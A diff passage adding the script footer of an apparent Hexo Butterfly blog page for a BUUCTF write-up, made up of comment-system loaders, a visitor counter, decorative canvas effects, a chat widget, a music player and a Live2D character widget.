+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://tanchiyu.top/2021/01/20/BUUCTF-13/'
+    this.page.identifier = '2021/01/20/BUUCTF-13/'
+    this.page.title = 'BUUCTF13'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
